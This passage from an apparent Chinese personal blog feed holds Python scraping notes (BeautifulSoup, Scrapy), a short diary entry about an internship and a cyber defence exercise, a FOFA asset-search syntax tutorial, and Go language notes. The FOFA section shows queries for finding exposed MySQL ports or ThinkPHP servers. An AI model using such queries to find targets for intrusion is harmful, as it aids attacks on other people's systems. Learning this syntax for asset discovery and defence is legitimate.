class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">html_doc = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;</span></span><br><span class="line"><span class="string">and they lived at the bottom of a well.&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#创建一个BeautifulSoup解析对象</span></span><br><span class="line">soup = BeautifulSoup(html_doc,<span class="string">&quot;html.parser&quot;</span>,from_encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="comment">#获取所有的链接</span></span><br><span class="line">links = soup.find_all(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;所有的链接&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">    <span class="built_in">print</span> (link.name,link[<span class="string">&#x27;href&#x27;</span>],link.get_text())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;获取特定的URL地址&quot;</span>)</span><br><span class="line">link_node = soup.find(<span class="string">&#x27;a&#x27;</span>,href=<span class="string">&quot;http://example.com/elsie&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (link_node.name,link_node[<span class="string">&#x27;href&#x27;</span>],link_node[<span class="string">&#x27;class&#x27;</span>],link_node.get_text())</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;正则表达式匹配&quot;</span>)</span><br><span class="line">link_node = soup.find(<span class="string">&#x27;a&#x27;</span>,href=re.<span class="built_in">compile</span>(<span class="string">r&quot;ti&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> (link_node.name,link_node[<span class="string">&#x27;href&#x27;</span>],link_node[<span class="string">&#x27;class&#x27;</span>],link_node.get_text())</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;获取P段落的文字&quot;</span>)</span><br><span class="line">p_node = soup.find(<span class="string">&#x27;p&#x27;</span>,class_=<span class="string">&#x27;story&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (p_node.name,p_node[<span class="string">&#x27;class&#x27;</span>],p_node.get_text())</span><br></pre></td></tr></table></figure><h1 id="Scrapy"><a href="#Scrapy" class="headerlink" title="Scrapy"></a>Scrapy</h1><p>Scrapy 是用 Python 实现的一个为了爬取网站数据、提取结构性数据而编写的应用框架。</p><p>Scrapy 常应用在包括数据挖掘，信息处理或存储历史数据等一系列的程序中。</p><p>通常我们可以很简单的通过 Scrapy 框架实现一个爬虫，抓取指定网站的内容或图片。</p><p><img src="/PyPic/2.jpg" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Scrapy Engine(引擎): 负责Spider、ItemPipeline、Downloader、Scheduler中间的通讯，信号、数据传递等。</span><br><span class="line"></span><br><span class="line">Scheduler(调度器): 它负责接受引擎发送过来的Request请求，并按照一定的方式进行整理排列，入队，当引擎需要时，交还给引擎。</span><br><span class="line"></span><br><span class="line">Downloader（下载器）：负责下载Scrapy Engine(引擎)发送的所有Requests请求，并将其获取到的Responses交还给Scrapy Engine(引擎)，由引擎交给Spider来处理，</span><br><span class="line"></span><br><span class="line">Spider（爬虫）：它负责处理所有Responses,从中分析提取数据，获取Item字段需要的数据，并将需要跟进的URL提交给引擎，再次进入Scheduler(调度器).</span><br><span class="line"></span><br><span class="line">Item Pipeline(管道)：它负责处理Spider中获取到的Item，并进行进行后期处理（详细分析、过滤、存储等）的地方。</span><br><span class="line"></span><br><span class="line">Downloader Middlewares（下载中间件）：你可以当作是一个可以自定义扩展下载功能的组件。</span><br><span class="line"></span><br><span class="line">Spider Middlewares（Spider中间件）：你可以理解为是一个可以自定扩展和操作引擎和Spider中间通信的功能组件（比如进入Spider的Responses;和从Spider出去的Requests）</span><br></pre></td></tr></table></figure><h2 id="scrapy的运作流程"><a href="#scrapy的运作流程" class="headerlink" title="scrapy的运作流程"></a>scrapy的运作流程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1 引擎：Hi！Spider, 你要处理哪一个网站？</span><br><span class="line">2 Spider：老大要我处理xxxx.com。</span><br><span class="line">3 引擎：你把第一个需要处理的URL给我吧。</span><br><span class="line">4 Spider：给你，第一个URL是xxxxxxx.com。</span><br><span class="line">5 引擎：Hi！调度器，我这有request请求你帮我排序入队一下。</span><br><span class="line">6 调度器：好的，正在处理你等一下。</span><br><span class="line">7 引擎：Hi！调度器，把你处理好的request请求给我。</span><br><span class="line">8 调度器：给你，这是我处理好的request</span><br><span class="line">9 引擎：Hi！下载器，你按照老大的下载中间件的设置帮我下载一下这个request请求</span><br><span class="line">10 下载器：好的！给你，这是下载好的东西。（如果失败：sorry，这个request下载失败了。然后引擎告诉调度器，这个request下载失败了，你记录一下，我们待会儿再下载）</span><br><span class="line">11 引擎：Hi！Spider，这是下载好的东西，并且已经按照老大的下载中间件处理过了，你自己处理一下（注意！这儿responses默认是交给def parse()这个函数处理的）</span><br><span class="line">12 Spider：（处理完毕数据之后对于需要跟进的URL），Hi！引擎，我这里有两个结果，这个是我需要跟进的URL，还有这个是我获取到的Item数据。</span><br><span class="line">13 引擎：Hi ！管道 我这儿有个item你帮我处理一下！调度器！这是需要跟进URL你帮我处理下。然后从第四步开始循环，直到获取完老大需要全部信息。</span><br><span class="line">14 管道调度器：好的，现在就做！</span><br></pre></td></tr></table></figure><ul><li><strong>注意！只有当调度器中不存在任何request了，整个程序才会停止，（也就是说，对于下载失败的URL，Scrapy也会重新下载。）</strong></li></ul><h3 id="制作scrapy爬虫的步骤"><a href="#制作scrapy爬虫的步骤" class="headerlink" title="制作scrapy爬虫的步骤"></a>制作scrapy爬虫的步骤</h3><ol><li>新建项目 (scrapy startproject xxx)：新建一个新的爬虫项目</li><li>明确目标 （编写items.py）：明确你想要抓取的目标</li><li>制作爬虫 （spiders&#x2F;xxspider.py）：制作爬虫开始爬取网页</li><li>存储内容 （pipelines.py）：设计管道存储爬取内容</li></ol><h2 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">win：</span><br><span class="line">升级pip：</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">安装：</span><br><span class="line">pip install Scrapy</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu：</span><br><span class="line">安装费Python的依赖：</span><br><span class="line">sudo apt-get install python-dev python-pip libxml2-dev libxslt1-dev zlib1g-dev libffi-dev libssl-dev</span><br><span class="line">通过pip安装Scrapy框架：</span><br><span class="line">sudo pip install scrapy</span><br></pre></td></tr></table></figure><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="一、新建项目"><a href="#一、新建项目" class="headerlink" title="一、新建项目"></a>一、新建项目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject mySpider</span><br></pre></td></tr></table></figure><p><img src="/PyPic/3.png" alt="image"></p><p>目录结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mySpider/</span><br><span class="line">    scrapy.cfg</span><br><span class="line">    mySpider/</span><br><span class="line">        __init__.py</span><br><span class="line">        items.py</span><br><span class="line">        pipelines.py</span><br><span class="line">        settings.py</span><br><span class="line">        spiders/</span><br><span class="line">            __init__.py</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure><ul><li>scrapy.cfg: 项目的配置文件。</li><li>mySpider&#x2F;: 项目的Python模块，将会从这里引用代码。</li><li>mySpider&#x2F;items.py: 项目的目标文件。</li><li>mySpider&#x2F;pipelines.py: 项目的管道文件。</li><li>mySpider&#x2F;settings.py: 项目的设置文件。</li><li>mySpider&#x2F;spiders&#x2F;: 存储爬虫代码目录。</li></ul><h4 id="二、明确目标"><a href="#二、明确目标" class="headerlink" title="二、明确目标"></a>二、明确目标</h4><ol><li>打开 mySpider 目录下的 items.py。</li><li>Item 定义结构化数据字段，用来保存爬取到的数据，有点像 Python 中的 dict，但是提供了一些额外的保护减少错误。</li><li>可以通过创建一个 scrapy.Item 类， 并且定义类型为 scrapy.Field 的类属性来定义一个 Item（可以理解成类似于 ORM 的映射关系）。</li><li>接下来，创建一个 ItcastItem 类，和构建 item 模型（model）。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ItcastItem</span>(scrapy.Item):</span><br><span class="line">   name = scrapy.Field()</span><br><span class="line">   title = scrapy.Field()</span><br><span class="line">   info = scrapy.Field()</span><br></pre></td></tr></table></figure><h4 id="三、制作爬虫"><a href="#三、制作爬虫" class="headerlink" title="三、制作爬虫"></a>三、制作爬虫</h4><ul><li>爬数据e</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在mySpider/spider目录下创建一个名为itcast的爬虫，并指定爬取域的范围：</span><br><span class="line">scrapy genspider itcast &quot;itcast.cn&quot;</span><br></pre></td></tr></table></figure><p>在mySpider&#x2F;spiders&#x2F;items.py中出现如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ItcastSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&quot;itcast&quot;</span></span><br><span class="line">    allowed_domains = [<span class="string">&quot;itcast.cn&quot;</span>]</span><br><span class="line">    start_urls = [<span class="string">&quot;https://itcast.cn&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">name = &quot;&quot; ：这个爬虫的识别名称，必须是唯一的，在不同的爬虫必须定义不同的名字。</span><br><span class="line"></span><br><span class="line">allow_domains = [] 是搜索的域名范围，也就是爬虫的约束区域，规定爬虫只爬取这个域名下的网页，不存在的URL会被忽略。</span><br><span class="line"></span><br><span class="line">start_urls = () ：爬取的URL元祖/列表。爬虫从这里开始抓取数据，所以，第一次下载的数据将会从这些urls开始。其他子URL将会从这些起始URL中继承性生成。</span><br><span class="line"></span><br><span class="line">parse(self, response) ：解析的方法，每个初始URL完成下载后将被调用，调用的时候传入从每一个URL传回的Response对象来作为唯一参数，主要作用如下：</span><br><span class="line"></span><br><span class="line">负责解析返回的网页数据(response.body)，提取结构化数据(生成item)</span><br><span class="line">生成需要下一页的URL请求。</span><br></pre></td></tr></table></figure><p>将start_urls的值修改为需要爬取的第一个url：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start_urls = (<span class="string">&quot;http://www.itcast.cn/channel/teacher.shtml&quot;</span>,)</span><br></pre></td></tr></table></figure><p>修改parse()方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">    filename = <span class="string">&quot;teacher.html&quot;</span></span><br><span class="line">    <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>).write(response.body)</span><br></pre></td></tr></table></figure><p>运行，在mySpider目录下执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def parse(self, response):</span><br><span class="line">    filename = &quot;teacher.html&quot;</span><br><span class="line">    open(filename, &#x27;w&#x27;).write(response.body)</span><br></pre></td></tr></table></figure><ul><li>取数据</li></ul><p>上XPath</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>闲话时间1</title>
      <link href="/2024/09/30/%E9%97%B2%E8%AF%9D%E6%97%B6%E9%97%B41/"/>
      <url>/2024/09/30/%E9%97%B2%E8%AF%9D%E6%97%B6%E9%97%B41/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>入职了，说实话工作挺轻松的，基本上没什么事情，也许国庆后会渐渐忙碌起来</p><p>然后我也算是参与护网了吧，虽然是啥都没干，因为我去的时候已经基本结束了，但还是可以写进我的简历里面。</p><p>还有就是写了标书，其实还蛮简单的，主要是找材料吧，别的都比较简单。</p><p>马上也是要21岁了，时间过得真快啊，不知不觉我也成了一位上班族，想当初我雄心壮志，想了很多种职业，最后一投简历就老实了。</p><p>现在正是换季的时候，我也不出意外的感冒了，现在在公司就是喝热水，抽空看看论坛啥的，也算是比较闲啦！</p><p>如果不是公司离家里距离比较远，其实我还是很满意这份实习的，国庆后领导说带我去打护网见识见识，等打完护网再去租个房子吧！</p><p>加油加油！</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 茶水间 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FOFA速成</title>
      <link href="/2024/09/29/FOFA%E9%80%9F%E6%88%90/"/>
      <url>/2024/09/29/FOFA%E9%80%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>[参考]: 信息收集：网络空间测绘FOFA，查询语法最全使用方法（图文解析） - 白小雨 - 博客园 (cnblogs.com)(<a href="https://www.cnblogs.com/xiaoyus/p/18418594">https://www.cnblogs.com/xiaoyus/p/18418594</a>)</p><h1 id="什么是FOFA"><a href="#什么是FOFA" class="headerlink" title="什么是FOFA"></a>什么是FOFA</h1><p><em>FOFA－网络空间资产搜索引擎是华顺信安推出的一款通过对全球网络对外开放服务的资产进行主动或被动方式探测、抓取、存储，分析整理不同种类的网络空间资产指纹信息（规则），并对符合规则的资产进行统计分析，进而快速检索全球网络空间资产的产品。</em></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">它能够帮助用户迅速进行网络资产匹配，快速开展网络空间威胁态势感知、漏洞影响范围分析、应用分布统计、应用流行度排名统计等工作。</span><br></pre></td></tr></table></figure><p>基础类别</p><p><img src="/fofaPic/image-20240929173002706.png" alt="image-20240929173002706"></p><p>标记类</p><p><img src="/fofaPic/image-20240930091453085.png" alt="image-20240930091453085"></p><p>协议类</p><p><img src="/fofaPic/image-20240929173050298.png" alt="image-20240929173050298"></p><p>网站类</p><p><img src="/fofaPic/image-20240930091526745.png" alt="image-20240930091526745"></p><p>证书类：</p><p><img src="/fofaPic/image-20240929173157563.png" alt="image-20240929173157563"></p><p>地理位置：</p><p><img src="/fofaPic/image-20240929173342664.png" alt="图片"></p><p>时间类：</p><p><img src="/fofaPic/image-20240929173316328.png" alt="image-20240929173316328"></p><p>独立ip：</p><p><img src="/fofaPic/image-20240929173447317.png" alt="image-20240929173447317"></p><h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><p>直接输入查询语句，将从标题，<code>html内容</code>，<code>http头信息</code>，<code>url字段</code>中搜索；</p><ul><li><h4 id="html搜索"><a href="#html搜索" class="headerlink" title="html搜索"></a>html搜索</h4></li></ul><p>我们找到某云的登录提示，因为文字在网页中皆属于html</p><p><img src="/fofaPic/image-20240930091935078.png" alt="image-20240930091935078"></p><p>复制在fofa查询，发现还有其他的网站使用了关联的内容（使用&amp;&amp;关联查询）</p><p><img src="/fofaPic/image-20240930092644182.png" alt="image-20240930092644182"></p><p>对于html：</p><p><img src="/fofaPic/image-20240930093118339.png" alt="image-20240930093118339"></p><ul><li><h4 id="title标题搜索："><a href="#title标题搜索：" class="headerlink" title="title标题搜索："></a>title标题搜索：</h4></li></ul><p><img src="/fofaPic/image-20240930094315128.png" alt="image-20240930094315128"></p><ul><li><h4 id="domain域名搜索："><a href="#domain域名搜索：" class="headerlink" title="domain域名搜索："></a>domain域名搜索：</h4></li></ul><p><img src="/fofaPic/image-20240930094913637.png" alt="image-20240930094913637"></p><p>如果查询表达式有多个与或关系，尽量在外面用<code>()</code>包含起来，比如这样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&quot;?id=1&quot;) &amp;&amp; (country=&quot;CN&quot;) &amp;&amp; (domain=&quot;baidu.com&quot;)</span><br></pre></td></tr></table></figure><ul><li><h4 id="host主机名搜索"><a href="#host主机名搜索" class="headerlink" title="host主机名搜索"></a>host主机名搜索</h4></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">host==&quot;主机名&quot;</span><br><span class="line">//=是模糊匹配，==是精准匹配</span><br></pre></td></tr></table></figure><p><img src="/fofaPic/image-20240930095259598.png" alt="image-20240930095259598"></p><ul><li><h4 id="os操作系统搜索"><a href="#os操作系统搜索" class="headerlink" title="os操作系统搜索"></a>os操作系统搜索</h4></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os==&quot;windows&quot;</span><br></pre></td></tr></table></figure><ul><li><h4 id="server服务器查询"><a href="#server服务器查询" class="headerlink" title="server服务器查询"></a>server服务器查询</h4></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server=&quot;nginx&quot;</span><br></pre></td></tr></table></figure><ul><li><h4 id="org所属组织"><a href="#org所属组织" class="headerlink" title="org所属组织"></a>org所属组织</h4></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org=&quot;  &quot;</span><br></pre></td></tr></table></figure><ul><li><h4 id="body搜索内容"><a href="#body搜索内容" class="headerlink" title="body搜索内容"></a>body搜索内容</h4></li></ul><p>通过html正文查询</p><p><img src="/fofaPic/image-20240930095703360.png" alt="image-20240930095703360"></p><ul><li><h4 id="js-name"><a href="#js-name" class="headerlink" title="js_name"></a>js_name</h4></li></ul><p>通过html正文中js进行查询</p><p><img src="/fofaPic/image-20240930095845862.png" alt="image-20240930095845862"></p><ul><li><h4 id="header"><a href="#header" class="headerlink" title="header"></a>header</h4></li></ul><p>header&#x3D;”thinkphp”</p><p><img src="/fofaPic/image-20240725001850709.png" alt="image-20240725001850709"></p><ul><li><h4 id="port"><a href="#port" class="headerlink" title="port"></a>port</h4></li></ul><p>port&#x3D;”3306”，找mysql的端口地址</p><p><img src="/fofaPic/image-20240725003601617.png" alt="image-20240725003601617"></p><ul><li><h4 id="icp"><a href="#icp" class="headerlink" title="icp"></a>icp</h4></li></ul><p>icp&#x3D;”备案号”</p><hr><ul><li><h4 id="status-code"><a href="#status-code" class="headerlink" title="status_code"></a>status_code</h4></li></ul><p>status_code&#x3D;”服务器状态码”</p><p><img src="/fofaPic/image-20240725004341624.png" alt="image-20240725004341624"></p><ul><li><h4 id="protocol"><a href="#protocol" class="headerlink" title="protocol"></a>protocol</h4></li></ul><p>protocol&#x3D;”协议类型” ，例如https&#x2F;ssh&#x2F;http</p><p><img src="/fofaPic/image-20240725004526645.png" alt="image-20240725004526645"></p><ul><li><h4 id="country"><a href="#country" class="headerlink" title="country"></a>country</h4></li></ul><p>country&#x3D;”国家编码”</p><p><img src="/fofaPic/image-20240725004636636.png" alt="image-20240725004636636"></p><ul><li><h4 id="region"><a href="#region" class="headerlink" title="region"></a>region</h4></li></ul><p>region&#x3D;”行政区”，英文名称即可</p><p><img src="/fofaPic/image-20240725004753434.png" alt="image-20240725004753434"></p><ul><li><h4 id="city"><a href="#city" class="headerlink" title="city"></a>city</h4></li></ul><p>city&#x3D;”城市”</p><p><img src="/fofaPic/image-20240725004847385.png" alt="image-20240725004847385"></p><ul><li><h4 id="app"><a href="#app" class="headerlink" title="app"></a>app</h4></li></ul><p>app&#x3D;”设备”</p><p><img src="/fofaPic/image-20240725005003358.png" alt="image-20240725005003358"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GO语言2</title>
      <link href="/2024/09/23/GO%E8%AF%AD%E8%A8%802/"/>
      <url>/2024/09/23/GO%E8%AF%AD%E8%A8%802/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Go-语言数据类型"><a href="#Go-语言数据类型" class="headerlink" title="Go 语言数据类型"></a>Go 语言数据类型</h1><table><thead><tr><th align="left">序号</th><th align="left">类型和描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>布尔型</strong> 布尔型的值只可以是常量 true 或者 false。一个简单的例子：var b bool &#x3D; true。</td></tr><tr><td align="left">2</td><td align="left"><strong>数字类型</strong> 整型 int 和浮点型 float32、float64，Go 语言支持整型和浮点型数字，并且支持复数，其中位的运算采用补码。</td></tr><tr><td align="left">3</td><td align="left"><strong>字符串类型:</strong> 字符串就是一串固定长度的字符连接起来的字符序列。Go 的字符串是由单个字节连接起来的。Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本。</td></tr><tr><td align="left">4</td><td align="left"><strong>派生类型:</strong> 包括：(a) 指针类型（Pointer）(b) 数组类型(c) 结构化类型(struct)(d) Channel 类型(e) 函数类型(f) 切片类型(g) 接口类型（interface）(h) Map 类型</td></tr></tbody></table><h3 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h3><table><thead><tr><th align="left">序号</th><th align="left">类型和描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>uint8</strong> 无符号 8 位整型 (0 到 255)</td></tr><tr><td align="left">2</td><td align="left"><strong>uint16</strong> 无符号 16 位整型 (0 到 65535)</td></tr><tr><td align="left">3</td><td align="left"><strong>uint32</strong> 无符号 32 位整型 (0 到 4294967295)</td></tr><tr><td align="left">4</td><td align="left"><strong>uint64</strong> 无符号 64 位整型 (0 到 18446744073709551615)</td></tr><tr><td align="left">5</td><td align="left"><strong>int8</strong> 有符号 8 位整型 (-128 到 127)</td></tr><tr><td align="left">6</td><td align="left"><strong>int16</strong> 有符号 16 位整型 (-32768 到 32767)</td></tr><tr><td align="left">7</td><td align="left"><strong>int32</strong> 有符号 32 位整型 (-2147483648 到 2147483647)</td></tr><tr><td align="left">8</td><td align="left"><strong>int64</strong> 有符号 64 位整型 (-9223372036854775808 到 9223372036854775807)</td></tr></tbody></table><h3 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h3><table><thead><tr><th align="left">序号</th><th align="left">类型和描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>float32</strong> IEEE-754 32位浮点型数</td></tr><tr><td align="left">2</td><td align="left"><strong>float64</strong> IEEE-754 64位浮点型数</td></tr><tr><td align="left">3</td><td align="left"><strong>complex64</strong> 32 位实数和虚数</td></tr><tr><td align="left">4</td><td align="left"><strong>complex128</strong> 64 位实数和虚数</td></tr></tbody></table><h3 id="其他数字类型"><a href="#其他数字类型" class="headerlink" title="其他数字类型"></a>其他数字类型</h3><table><thead><tr><th align="left">序号</th><th align="left">类型和描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>byte</strong> 类似 uint8</td></tr><tr><td align="left">2</td><td align="left"><strong>rune</strong> 类似 int32</td></tr><tr><td align="left">3</td><td align="left"><strong>uint</strong> 32 或 64 位</td></tr><tr><td align="left">4</td><td align="left"><strong>int</strong> 与 uint 一样大小</td></tr><tr><td align="left">5</td><td align="left"><strong>uintptr</strong> 无符号整型，用于存放一个指针</td></tr></tbody></table><h1 id="GO语言变量"><a href="#GO语言变量" class="headerlink" title="GO语言变量"></a>GO语言变量</h1><p>Go 语言变量名由字母、数字、下划线组成，其中首个字符不能为数字。</p><p>声明变量的一般形式是使用 var 关键字：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> identifier <span class="keyword">type</span></span><br></pre></td></tr></table></figure><p>一次声明多个变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> identifier1, identifier2 <span class="keyword">type</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> a <span class="type">string</span> = <span class="string">&quot;Runoob&quot;</span></span><br><span class="line">    fmt.Println(a)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> b, c <span class="type">int</span> = <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">    fmt.Println(b, c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Result：</span><br><span class="line">PS D:\Go\go_WorkSpace&gt; go run hello.go</span><br><span class="line">Runoob</span><br><span class="line">1 2</span><br></pre></td></tr></table></figure><h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><h4 id="第一种，指定变量类型，如果没有初始化，则变量默认为零值"><a href="#第一种，指定变量类型，如果没有初始化，则变量默认为零值" class="headerlink" 